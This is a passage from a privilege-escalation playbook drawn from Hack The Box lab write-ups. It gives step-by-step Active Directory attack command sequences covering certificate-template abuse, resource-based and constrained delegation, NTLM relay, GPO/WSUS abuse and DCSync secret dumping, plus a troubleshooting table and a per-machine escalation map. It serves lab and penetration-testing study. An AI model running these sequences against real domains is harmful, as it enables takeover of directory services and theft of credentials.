- [Authority](./htb-writeups/Authority.pdf): CorpVPN enrollment belongs to Domain Computers, so first create/control a machine account through MachineAccountQuota.

### ESC4: template ACL control

[EscapeTwo](./htb-writeups/EscapeTwo.pdf): `ca_svc`/Cert Publishers controls `DunderMifflinAuthentication`.

```bash
certipy template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> \
  -template '<TEMPLATE>' -save-old
# Request the now-authorizing certificate, then restore the saved template configuration.
```

Do not leave a template weakened after testing.

### ESC7: CA officer/ManageCA

[Manager](./htb-writeups/Manager.pdf): a denied SubCA request can still return a request ID and save the private key.

```bash
certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template SubCA -upn 'Administrator@<DOMAIN>'
# Preserve request ID and private key from the expected denial.
certipy ca -u '<OFFICER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -issue-request <REQUEST_ID>
certipy req -u '<OFFICER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -retrieve <REQUEST_ID>
```

If cleanup removed officer rights, re-establish the authorized officer step before issuance. Match the retrieved request to the saved private key.

### ESC9 and SID-extension omissions

[Certified](./htb-writeups/Certified.pdf) exact ordering:

```bash
# 1. As the controlling principal, change ca_operator's UPN to Administrator.
certipy account update -u '<CONTROLLER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> \
  -user ca_operator -upn Administrator
# 2. Enroll ca_operator through CertifiedAuthentication and save administrator.pfx.
certipy req -u 'ca_operator@<DOMAIN>' -hashes ':<CA_OPERATOR_NT_HASH>' \
  -dc-ip <DC_IP> -ca '<CA_NAME>' -template CertifiedAuthentication
# 3. REQUIRED: restore the UPN before authenticating the PFX.
certipy account update -u '<CONTROLLER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> \
  -user ca_operator -upn 'ca_operator@<DOMAIN>'
# 4. Only now authenticate.
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

Restoring the UPN before `certipy auth` is part of the working sequence, not optional cleanup.

[Fluffy](./htb-writeups/Fluffy.pdf): ESC16 is CA-wide omission of the SID security extension. Temporarily set `ca_svc`'s UPN to Administrator, request the ordinary User template, restore the original UPN, then authenticate.

### ESC15 and other template-specific paths

[TombWatcher](./htb-writeups/TombWatcher.pdf): prove WebServer template schema/version and control before using the ESC15 path. Enroll via the authorized certificate account, obtain the Administrator-authenticating PFX, then use PKINIT/NT-hash recovery.

### Authority: PKINIT failure to PassTheCert/RBCD

[Authority](./htb-writeups/Authority.pdf) is not direct certificate-to-DCSync:

```bash
certipy auth -pfx administrator_authority.pfx -dc-ip <DC_IP>
# Expected here: KDC_ERR_PADATA_TYPE_NOSUPP

openssl pkcs12 -in administrator_authority.pfx -clcerts -nokeys -out administrator.crt
openssl pkcs12 -in administrator_authority.pfx -nocerts -nodes -out administrator.key

python3 passthecert.py -action write_rbcd \
  -crt administrator.crt -key administrator.key \
  -domain <DOMAIN> -dc-ip <DC_IP> -port 636 \
  -delegate-to 'AUTHORITY$' -delegate-from 'EVIL01$'

getST.py -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator \
  '<DOMAIN>/EVIL01$:<MACHINE_PASSWORD>' -dc-ip <DC_IP>
export KRB5CCNAME="$PWD/Administrator.ccache"
secretsdump.py -k -no-pass '<DOMAIN>/Administrator@AUTHORITY.authority.htb' -just-dc-ntlm
```

Use LDAPS/Schannel and the exact machine names. The certificate writes RBCD; the delegated Kerberos ticket enables the secrets dump.

### Generic RBCD

Prerequisites: control a principal with an SPN (often a machine account), and write access to the target's `msDS-AllowedToActOnBehalfOfOtherIdentity`.

```bash
addcomputer.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> \
  -computer-name 'EVIL$' -computer-pass '<MACHINE_PASSWORD>'

rbcd.py -delegate-from 'EVIL$' -delegate-to '<TARGET_COMPUTER>$' -action write \
  '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

getST.py -spn 'cifs/<TARGET_FQDN>' -impersonate Administrator \
  '<DOMAIN>/EVIL$:<MACHINE_PASSWORD>' -dc-ip <DC_IP>
export KRB5CCNAME="$PWD/Administrator.ccache"
wmiexec.py -k -no-pass '<DOMAIN>/Administrator@<TARGET_FQDN>'
```

Match `cifs`, `HOST`, `HTTP`, or another SPN to the final protocol. A ticket for the wrong service is not a failed RBCD write.

- [Support](./htb-writeups/Support.pdf): derive the controlled machine hash, write RBCD, request S4U while impersonating Administrator, and select the service SPN for the desired remote protocol.

[Vintage](./htb-writeups/Vintage.pdf): after adding `FS01$` to DelegatedAdmins, a normal machine TGT is not enough:

```bash
# Obtain a forwardable TGT; verify the forwardable flag with klist -f.
printf '%s\n' '<FS01_MACHINE_PASSWORD>' | kinit -f 'FS01$'
klist -f

# Administrator is restricted from delegation/network logon. Impersonate the delegable DA instead,
# request CIFS, and substitute HTTP so the ticket can authenticate WinRM.
impacket-getST -spn 'cifs/<DC_FQDN>' -altservice 'HTTP/<DC_FQDN>' \
  -impersonate 'L.BIANCHI_ADM' -dc-ip '<DC_FQDN>' \
  '<DOMAIN>/FS01$:<FS01_MACHINE_PASSWORD>'
export KRB5CCNAME="$PWD/<GETST_OUTPUT_CCACHE>"
klist
evil-winrm -r <DOMAIN> -i <DC_FQDN>
```

[RustyKey](./htb-writeups/RustyKey.pdf): cleanup automation can revert the ACL/password state while you work. Reset and consume credentials as one operation:

```bash
# After confirming the controlled machine is still in HelpDesk, reset bb.morgan and
# request the TGT immediately—do not leave a delay for the cleanup task.
bloodyAD -k --dc-ip <DC_IP> --host <DC_FQDN> -d <DOMAIN> \
  -u '<CONTROLLED_MACHINE$>' -p '<MACHINE_PASSWORD>' \
  set password bb.morgan '<NEW_BB_PASSWORD>'
getTGT.py '<DOMAIN>/bb.morgan:<NEW_BB_PASSWORD>' -dc-ip <DC_IP>
```

If `getTGT.py` returns `KDC_ERR_PREAUTH_FAILED`, assume the cleanup task reverted the password: force-change it again and immediately request a fresh TGT. Before the later `dd.ali` SPN-less RBCD steps, re-check that `<CONTROLLED_MACHINE$>` is still in HelpDesk and re-add it through the proven `AddSelf` ACE if cleanup removed it. MachineAccountQuota is zero, so use the controlled user for SPN-less RBCD; Administrator is sensitive/non-delegable, so impersonate `backupadmin` via the audited U2U/session-key flow.

### Rebound: two-ticket RBCD/KCD bridge

[Rebound](./htb-writeups/Rebound.pdf) cannot be solved by one classic `getST` call.

```bash
# 1. Short hostname MUST be first; otherwise rbcd.py can return "invalid server address".
printf '%s\n' '<DC_IP> dc01 dc01.rebound.htb rebound.htb' | sudo tee -a /etc/hosts

# 2. Write RBCD over LDAPS: ldap_monitor has an SPN and may act on delegator$.
rbcd.py '<DOMAIN>/delegator$' -hashes ':<DELEGATOR_NT_HASH>' -k \
  -delegate-from 'ldap_monitor' -delegate-to 'delegator$' -action write \
  -dc-ip dc01 -use-ldaps

# 3. Through ldap_monitor, obtain a FORWARDABLE browser ticket for the DC account.
getST.py '<DOMAIN>/ldap_monitor:<LDAP_MONITOR_PASSWORD>' \
  -spn 'browser/dc01.rebound.htb' -impersonate 'DC01$' \
  -dc-ip dc01.rebound.htb
export RBCD_FORWARDABLE="$PWD/DC01\$@browser_dc01.rebound.htb@<REALM>.ccache"
describeTicket.py "$RBCD_FORWARDABLE"              # flags must include forwardable

# 4. Feed that first ticket to delegator$ as the additional S4U2Proxy ticket.
getST.py '<DOMAIN>/delegator$' -hashes ':<DELEGATOR_NT_HASH>' \
  -spn 'http/dc01.rebound.htb' -additional-ticket "$RBCD_FORWARDABLE" \
  -impersonate 'DC01$' -dc-ip dc01.rebound.htb

# 5. Use the resulting DC01$ HTTP ticket for the replication request.
export KRB5CCNAME="$PWD/DC01\$@http_dc01.rebound.htb@<REALM>.ccache"
secretsdump.py -k -no-pass dc01.rebound.htb -just-dc-user Administrator
```

Use the filenames actually printed by `getST.py` if the local fork names its caches differently. Administrator is `NOT_DELEGATED`; the bridge deliberately impersonates replication-capable `DC01$` instead.

If the first attempt returns `KDC_ERR_BADOPTION`, re-check forwardability, the additional-ticket cache, principal case, SPNs, and the required Impacket fork.

### gMSA, LAPS, and dMSA/BadSuccessor

gMSA:

```bash
nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --gmsa
```

Read `msDS-ManagedPassword` only when the controlled principal has that right; derive the NT hash, then authenticate as the gMSA.

- [Intelligence](./htb-writeups/Intelligence.pdf): the recovered gMSA has constrained delegation to a DC service; request the correct S4U ticket and use Kerberos-aware remote execution.
- [DarkZero](./htb-writeups/DarkZero.pdf): cross-domain SQL/trust movement eventually uses delegation rather than treating the service password alone as domain compromise.

LAPS:

```bash
nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --module laps
```

The result is host-specific. [Timelapse](./htb-writeups/Timelapse.pdf) and [StreamIO](./htb-writeups/StreamIO.pdf) both require reaching the principal/group with LAPS read rights first.

dMSA/BadSuccessor ([Eighteen](./htb-writeups/Eighteen.pdf)):

- Derive/inject Adam Scott's Kerberos material into the Logon Type 9 session.
- Create the weaponized dMSA in the controlled Staff OU and link it to Administrator with SharpSuccessor/BadSuccessor attributes.
- A tool may print an error after creating the object; verify directory state/logs before assuming failure.
- Use `Rubeus tgtdeleg`, then request/inject the dMSA service ticket and validate the resulting CIFS access.

### Constrained and unconstrained delegation

```bash
findDelegation.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

- [Intelligence](./htb-writeups/Intelligence.pdf): the gMSA's constrained delegation targets a DC service; SPN and time must be correct.
- [DarkZero](./htb-writeups/DarkZero.pdf): forest TGT delegation is enabled and DC02 has unconstrained delegation. Monitor tickets on DC02, coerce DC01 through MSSQL `xp_dirtree` to a UNC path on DC02, export DC01$'s delegated TGT, convert it to ccache, then DCSync the original domain.
- [Rebound](./htb-writeups/Rebound.pdf): constrained delegation without protocol transition requires the two-ticket bridge above.

### NTLM reflection, relay, and coercion

Always prove four independent pieces: coercion, received authentication, relay compatibility, and privileged action.

[Signed](./htb-writeups/Signed.pdf), CVE-2025-33073:

```bash
# Requires Impacket 0.13.0+ for the WINRMS protocol client.
proxychains -q ntlmrelayx.py -t 'winrms://<DC_IP>' -smb2support
# Coerce the DC/machine to its marshaled self-name through the audited path.
```

HTTP 500 can still accompany a successful relayed login. The interactive WinRMS shell opens on `127.0.0.1:11000` through the SOCKS path; connect with `nc 127.0.0.1 11000` rather than expecting a normal Evil-WinRM session.

[APT](./htb-writeups/APT.pdf): submit the captured NTLMv1 response in the expected `NTHASH` format, recover `APT$`'s machine hash, then use its replication rights. Do not confuse captured NTLMv1 material with an immediately reusable NTLM hash.

### GPO and WSUS abuse

GPO ([TheFrizz](./htb-writeups/TheFrizz.pdf)):

- Prove control over the GPO and permission to link it to `OU=DOMAIN CONTROLLERS,...`.
- Add a computer scheduled task through the controlled GPO (for example with SharpGPOAbuse).
- Trigger/await `gpupdate`, validate SYSTEM execution, then remove the task/link and restore policy state.

WSUS ([Outdated](./htb-writeups/Outdated.pdf)):

```powershell
Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate'
Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU'
whoami /groups
```

Confirm WSUS-group membership, non-TLS WSUS URL, and `UseWUServer=1` before using SharpWSUS. Create the update, approve it only for the intended DC/computer group, keep the listener ready, wait/trigger installation, then delete the malicious approval/update.

### Application-specific domain escalation

- [Monteverde](./htb-writeups/Monteverde.pdf): query the ADSync database with local `sqlcmd`; extract `instance_id`, `keyset_id`, and entropy, then use the AD Connect decryption logic to recover the synchronization credential.
- [Cascade](./htb-writeups/Cascade.pdf): query deleted objects with `Get-ADObject -IncludeDeletedObjects`, retrieve all TempAdmin properties, decode `cascadeLegacyPwd`, and apply the email clue that it was reused for Administrator.
- [Builder](./htb-writeups/Builder.pdf): two verified Jenkins routes: use the SSH Agent plugin in a Pipeline with `sshagent(credentials: ['1'])` to SSH as root/read the root key, or call `hudson.util.Secret.decrypt(<encrypted credential>)` in the authenticated script console and use the decrypted key.
- [Quick](./htb-writeups/Quick.pdf): recursively inspect printer/cache configuration as `srvadm`; URL-decode the printer connection password and test the documented `su root` reuse.
- [Atom](./htb-writeups/Atom.pdf): decrypt the application-held Administrator password, then verify it over WinRM; the escalation is credential recovery, not a local exploit.

## Failure diagnosis

| Symptom | Likely cause | Re-check |
|---|---|---|
| SUID/program runs but shell is unprivileged | Effective ID dropped or shell reset it | `id`, trace `setuid`, use the intended `-p` only when appropriate |
| PATH payload never executes | Absolute path, sanitized PATH, wrong working directory/name | `strace -e execve`, `strings`, exact case/filename |
| Cron/task never triggers | Wrong path, disabled task, timing, user context | scheduler definition, timestamps, pspy/task history |
| Symlink moved but no content appears | Required print/read branch not enabled | LinkVortex `CHECK_CONTENT=true`, exact extension and race point |
| 7-Zip backup does not leak key | Wrong working directory or listfile name | literal `@id_rsa`, symlink target, privileged backup cwd |
| Certificate request succeeds but auth fails | Time, UPN restoration/order, PKINIT unsupported, wrong PFX | `date`, `klist`, ESC sequence, Schannel fallback |
| `KRB_AP_ERR_SKEW` | Clock mismatch | sync to DC and request a fresh ticket |
| `KDC_ERR_PADATA_TYPE_NOSUPP` | PKINIT unsupported | extract CRT/key and use PassTheCert if the ACL path allows it |
| `KDC_ERR_BADOPTION` | Non-forwardable/no protocol transition/non-delegable target | `klist -f`, SPNs, `NOT_DELEGATED`, additional ticket |
| RBCD ticket works for SMB but not WinRM | Wrong service SPN | request/substitute `HTTP`, preserve hostname |
| New group membership has no effect | Stale access token | log out and reconnect |
| PsExec gets SYSTEM but protected file is unreadable | User-bound EFS/DPAPI | use WMIExec/interactive session as the named user |
| WinRMS relay shows HTTP 500 | May be expected after successful login | check relay log and `127.0.0.1:11000` |

## Cleanup checklist

- [ ] Restore service `binPath`, startup state, and application configuration.
- [ ] Remove payloads, SUID shells, malicious packages/plugins, bytecode, symlinks, temporary keys, and task artifacts.
- [ ] Restore file ownership/mode and web-server configs; stop temporary listeners.
- [ ] Restore AD ownership/DACLs, group memberships, passwords when authorized, SPNs, pre-authentication flags, UPNs, key credentials, RBCD attributes, computer accounts, and template/CA changes.
- [ ] Remove GPO scheduled tasks/links and WSUS approvals.
- [ ] Destroy temporary tickets/PFX/private keys after recording non-secret evidence; unset `KRB5CCNAME`.
- [ ] Verify the original service/task still functions.

## Audited machine source map

Every available official PDF was considered. The anchor below is the decisive escalation boundary, not a substitute for that machine's checklist.

| # | Machine sources | Escalation anchor |
|---:|---|---|
| 1 | [Markup notes](./htb-writeups/Markup.md) · [PDF](./htb-writeups/Markup.pdf) | Writable `job.bat` executed by privileged scheduled task; exact path spelling matters. |
| 2 | [Busqueda notes](./htb-writeups/Busqueda.md) · [PDF](./htb-writeups/Busqueda.pdf) | Sudo `system-checkup` invokes cwd-controlled `./full-checkup.sh`; Docker inspection only recovers the Gitea admin secret. |
| 3 | [Sau notes](./htb-writeups/Sau.md) · [PDF](./htb-writeups/Sau.pdf) | Sudo `systemctl status` opens `less`; pager `!sh` retains root. |
| 4 | [Help notes](./htb-writeups/Help.md) · [PDF](./htb-writeups/Help.pdf) | Kernel-build/architecture-matched local exploit. |
| 5 | [Broker notes](./htb-writeups/Broker.md) · [PDF](./htb-writeups/Broker.pdf) | Root-run attacker Nginx/WebDAV config PUTs `/root/.ssh/authorized_keys`. |
| 6 | [Soccer notes](./htb-writeups/Soccer.md) · [PDF](./htb-writeups/Soccer.pdf) | SUID `doas` rule runs root `dstat`; writable named plugin executes on import. |
| 7 | [Keeper notes](./htb-writeups/Keeper.md) · [PDF](./htb-writeups/Keeper.pdf) | KeePass memory recovery, Unicode password reconstruction, PuTTY-to-OpenSSH root key conversion. |
| 8 | [Networked notes](./htb-writeups/Networked.md) · [PDF](./htb-writeups/Networked.pdf) | Sudo `changename.sh` writes a CentOS `ifcfg` value that is interpreted as code. |
| 9 | [BoardLight notes](./htb-writeups/BoardLight.md) · [PDF](./htb-writeups/BoardLight.pdf) | Root-owned SUID Enlightenment 0.23.1 helper, CVE-2022-37706. |
| 10 | [CozyHosting notes](./htb-writeups/CozyHosting.md) · [PDF](./htb-writeups/CozyHosting.pdf) | Sudo SSH `PermitLocalCommand` after valid localhost login; not ProxyCommand/unreachable-host abuse. |
| 11 | [Editorial notes](./htb-writeups/Editorial.md) · [PDF](./htb-writeups/Editorial.pdf) | Sudo GitPython clone URL accepts `ext::`; `%` represents the payload space. |
| 12 | [Pandora notes](./htb-writeups/Pandora.md) · [PDF](./htb-writeups/Pandora.pdf) | Escape restricted shell through SUID `at`, then SUID `pandora_backup` relative-`tar` PATH hijack. |
| 13 | [LinkVortex notes](./htb-writeups/LinkVortex.md) · [PDF](./htb-writeups/LinkVortex.pdf) | `clean_symlink.sh` race with required `CHECK_CONTENT=true` discloses root's SSH key. |
| 14 | [Dog notes](./htb-writeups/Dog.md) · [PDF](./htb-writeups/Dog.pdf) | Sudo Backdrop `bee` PHP evaluation creates/executes a privileged action or SUID shell. |
| 15 | [Usage notes](./htb-writeups/Usage.md) · [PDF](./htb-writeups/Usage.pdf) | Deterministic 7-Zip `@listfile` parsing plus `id_rsa` symlink; not a race. |
| 16 | [Titanic notes](./htb-writeups/Titanic.md) · [PDF](./htb-writeups/Titanic.pdf) | Root `magick identify` loads attacker `libxcb.so.1` from writable workdir; run created shell with `-p`. |
| 17 | [Outbound notes](./htb-writeups/Outbound.md) · [PDF](./htb-writeups/Outbound.pdf) | Sudo `below` log write through `/etc/passwd` symlink plus validated newline record. |
| 18 | [Editor notes](./htb-writeups/Editor.md) · [PDF](./htb-writeups/Editor.pdf) | Netdata-group SUID `ndsudo` resolves attacker-controlled `nvme` through PATH. |
| 19 | [Expressway notes](./htb-writeups/Expressway.md) · [PDF](./htb-writeups/Expressway.pdf) | Proxy-readable log reveals sudo host; `sudo -h <HOST>` CVE-2025-32462 path. |
| 20 | [ServMon notes](./htb-writeups/ServMon.md) · [PDF](./htb-writeups/ServMon.pdf) | Writable NSClient++ script/config plus permitted service restart executes as SYSTEM. |
| 21 | [Support notes](./htb-writeups/Support.md) · [PDF](./htb-writeups/Support.pdf) | Controlled machine-account RBCD, correct S4U SPN, delegated remote execution on DC. |
| 22 | [Access notes](./htb-writeups/Access.md) · [PDF](./htb-writeups/Access.pdf) | User-scoped DPAPI masterkey decrypts saved Administrator credential for a new session. |
| 23 | [Heist notes](./htb-writeups/Heist.md) · [PDF](./htb-writeups/Heist.pdf) | Recover privileged credential from the correct Firefox process-memory set. |
| 24 | [Active notes](./htb-writeups/Active.md) · [PDF](./htb-writeups/Active.pdf) | Kerberoast Administrator SPN, crack plaintext password, use password-authenticated WMIExec/PsExec. |
| 25 | [Forest notes](./htb-writeups/Forest.md) · [PDF](./htb-writeups/Forest.pdf) | Exchange Windows Permissions/domain WriteDACL grants controlled user DCSync. |
| 26 | [Sauna notes](./htb-writeups/Sauna.md) · [PDF](./htb-writeups/Sauna.pdf) | `svc_loanmgr` replication rights permit DCSync of Administrator. |
| 27 | [Return notes](./htb-writeups/Return.md) · [PDF](./htb-writeups/Return.pdf) | Server Operators changes VSS `binPath`, restarts it, and receives SYSTEM. |
| 28 | [Timelapse notes](./htb-writeups/Timelapse.md) · [PDF](./htb-writeups/Timelapse.pdf) | PowerShell history reaches `svc_deploy`; LAPS_Readers reveals host-specific Administrator password. |
| 29 | [Cicada notes](./htb-writeups/Cicada.md) · [PDF](./htb-writeups/Cicada.pdf) | Backup privileges save SAM/SYSTEM; offline extraction yields local Administrator hash. |
| 30 | [Fluffy notes](./htb-writeups/Fluffy.md) · [PDF](./htb-writeups/Fluffy.pdf) | CA-wide ESC16 SID-extension omission; temporary UPN change, enroll, restore, authenticate. |
| 31 | [Eighteen notes](./htb-writeups/Eighteen.md) · [PDF](./htb-writeups/Eighteen.pdf) | Controlled OU plus BadSuccessor/SharpSuccessor dMSA; verify object even if tool prints an error. |
| 32 | [Escape notes](./htb-writeups/Escape.md) · [PDF](./htb-writeups/Escape.pdf) | ESC1 UserAuthentication arbitrary Administrator UPN, PFX authentication, NT hash. |
| 33 | [Monteverde notes](./htb-writeups/Monteverde.md) · [PDF](./htb-writeups/Monteverde.pdf) | ADSync database IDs/entropy feed AD Connect credential decryption. |
| 34 | [Cascade notes](./htb-writeups/Cascade.md) · [PDF](./htb-writeups/Cascade.pdf) | Deleted TempAdmin object exposes decoded legacy password reused by Administrator. |
| 35 | [TheFrizz notes](./htb-writeups/TheFrizz.md) · [PDF](./htb-writeups/TheFrizz.pdf) | Controlled GPO linked to Domain Controllers deploys SYSTEM computer task. |
| 36 | [Puppy notes](./htb-writeups/Puppy.md) · [PDF](./htb-writeups/Puppy.pdf) | Binary-safe DPAPI blob/masterkey recovery decrypts administrative saved credential. |
| 37 | [Voleur notes](./htb-writeups/Voleur.md) · [PDF](./htb-writeups/Voleur.pdf) | Backup subsystem exposes NTDS/SYSTEM/SECURITY for offline domain hash extraction. |
| 38 | [Signed notes](./htb-writeups/Signed.md) · [PDF](./htb-writeups/Signed.pdf) | CVE-2025-33073 self-reflection relayed by Impacket 0.13+ to WinRMS; shell at local port 11000. |
| 39 | [TombWatcher notes](./htb-writeups/TombWatcher.md) · [PDF](./htb-writeups/TombWatcher.pdf) | ESC15 WebServer template abuse produces Administrator-authenticating certificate. |
| 40 | [UpDown notes](./htb-writeups/UpDown.md) · [PDF](./htb-writeups/UpDown.pdf) | Passwordless sudo `easy_install` executes malicious package setup action. |
| 41 | [Magic notes](./htb-writeups/Magic.md) · [PDF](./htb-writeups/Magic.pdf) | SUID `sysinfo` invokes unqualified utility from attacker-prepended PATH. |
| 42 | [Monitored notes](./htb-writeups/Monitored.md) · [PDF](./htb-writeups/Monitored.pdf) | Sudo profile collector follows controlled `phpmailer.log` symlink to root key. |
| 43 | [Builder notes](./htb-writeups/Builder.md) · [PDF](./htb-writeups/Builder.pdf) | Jenkins SSH Agent Pipeline or script-console `hudson.util.Secret.decrypt` recovers root SSH key. |
| 44 | [Browsed notes](./htb-writeups/Browsed.md) · [PDF](./htb-writeups/Browsed.pdf) | Poison writable Python cache only after transplanting legitimate first 16-byte `.pyc` header. |
| 45 | [StreamIO notes](./htb-writeups/StreamIO.md) · [PDF](./htb-writeups/StreamIO.pdf) | Core Staff membership permits target-computer LAPS read and local Administrator access. |
| 46 | [Intelligence notes](./htb-writeups/Intelligence.md) · [PDF](./htb-writeups/Intelligence.pdf) | Recovered gMSA has constrained delegation to a DC service; correct S4U ticket leads to admin. |
| 47 | [Jeeves notes](./htb-writeups/Jeeves.md) · [PDF](./htb-writeups/Jeeves.pdf) | KeePass yields Administrator NTLM hash for pass-the-hash; final flag is an NTFS ADS. |
| 48 | [Manager notes](./htb-writeups/Manager.md) · [PDF](./htb-writeups/Manager.pdf) | ESC7/SubCA denied request ID plus officer issuance/retrieval yields Administrator PFX. |
| 49 | [Aero notes](./htb-writeups/Aero.md) · [PDF](./htb-writeups/Aero.pdf) | Build/architecture-matched CLFS CVE-2023-28252 PoC executes as SYSTEM. |
| 50 | [Administrator notes](./htb-writeups/Administrator.md) · [PDF](./htb-writeups/Administrator.pdf) | GenericWrite targeted Kerberoast of Ethan, time sync if needed, then Ethan DCSync. |
| 51 | [Certified notes](./htb-writeups/Certified.md) · [PDF](./htb-writeups/Certified.pdf) | Shadow Credentials to `ca_operator`, ESC9, restore its UPN before authenticating Administrator PFX. |
| 52 | [Mailing notes](./htb-writeups/Mailing.md) · [PDF](./htb-writeups/Mailing.pdf) | Privileged LibreOffice opens CVE-2023-2255 document and executes staged payload. |
| 53 | [Intentions notes](./htb-writeups/Intentions.md) · [PDF](./htb-writeups/Intentions.pdf) | `cap_dac_read_search` scanner oracle reconstructs root SSH private key byte by byte. |
| 54 | [Flight notes](./htb-writeups/Flight.md) · [PDF](./htb-writeups/Flight.pdf) | IIS virtual account obtains machine TGT; computer-account context performs DCSync. |
| 55 | [Blackfield notes](./htb-writeups/Blackfield.md) · [PDF](./htb-writeups/Blackfield.pdf) | SeBackup extracts NTDS/SYSTEM; final WMIExec preserves Administrator EFS identity. |
| 56 | [EscapeTwo notes](./htb-writeups/EscapeTwo.md) · [PDF](./htb-writeups/EscapeTwo.pdf) | WriteOwner/reset `ca_svc`, ESC4 template modification, Administrator certificate, restore template. |
| 57 | [Mentor notes](./htb-writeups/Mentor.md) · [PDF](./htb-writeups/Mentor.pdf) | SNMP config reveals James credential; explicit sudo `/bin/sh` gives UID 0. |
| 58 | [Outdated notes](./htb-writeups/Outdated.md) · [PDF](./htb-writeups/Outdated.pdf) | WSUS-group control plus non-TLS WSUS approves targeted SYSTEM update on DC. |
| 59 | [Atom notes](./htb-writeups/Atom.md) · [PDF](./htb-writeups/Atom.pdf) | Decrypt application-held Administrator password and authenticate through WinRM. |
| 60 | [Authority notes](./htb-writeups/Authority.md) · [PDF](./htb-writeups/Authority.pdf) | MachineAccountQuota + ESC1; PKINIT unsupported, so PassTheCert writes RBCD before Kerberos secrets dump. |
| 61 | [Clicker notes](./htb-writeups/Clicker.md) · [PDF](./htb-writeups/Clicker.pdf) | Sudo `SETENV` proxy intercepts privileged curl; XXE response reads root SSH key. |
| 62 | [Cerberus notes](./htb-writeups/Cerberus.md) · [PDF](./htb-writeups/Cerberus.pdf) | ADSelfService CVE-2022-47966 using redirect GUID plus backup `issuer_url`; basename-only reversal. |
| 63 | [Cereal notes](./htb-writeups/Cereal.md) · [PDF](./htb-writeups/Cereal.pdf) | Local GraphQL SSRF feeds GenericPotato under SeImpersonate for SYSTEM token. |
| 64 | [Quick notes](./htb-writeups/Quick.md) · [PDF](./htb-writeups/Quick.pdf) | URL-decoded printer configuration password is reused by root. |
| 65 | [Vintage notes](./htb-writeups/Vintage.md) · [PDF](./htb-writeups/Vintage.pdf) | Forwardable `kinit -f` TGT; impersonate `L.BIANCHI_ADM` and use CIFS-to-HTTP altservice for WinRM. |
| 66 | [RustyKey notes](./htb-writeups/RustyKey.md) · [PDF](./htb-writeups/RustyKey.pdf) | MAQ-zero SPN-less RBCD/U2U; impersonate delegable `backupadmin`, not sensitive Administrator. |
| 67 | [DarkZero notes](./htb-writeups/DarkZero.md) · [PDF](./htb-writeups/DarkZero.pdf) | Cross-domain unconstrained delegation captures DC01$ TGT after MSSQL `xp_dirtree` coercion. |
| 68 | [Absolute notes](./htb-writeups/Absolute.md) · [PDF](./htb-writeups/Absolute.pdf) | RunasCs Logon Type 9 launches KrbRelay; validate port/CLSID and reconnect after group change. |
| 69 | [APT notes](./htb-writeups/APT.md) · [PDF](./htb-writeups/APT.pdf) | Crack NTLMv1 to `APT$` hash; machine account's replication rights DCSync Administrator. |
| 70 | [Multimaster notes](./htb-writeups/Multimaster.md) · [PDF](./htb-writeups/Multimaster.pdf) | GenericWrite reaches Jorden; Server Operators service-control path yields SYSTEM. |
| 71 | [Rebound notes](./htb-writeups/Rebound.md) · [PDF](./htb-writeups/Rebound.pdf) | Short-hostname-first RBCD plus forwardable DC01$ browser ticket and additional-ticket HTTP bridge. |




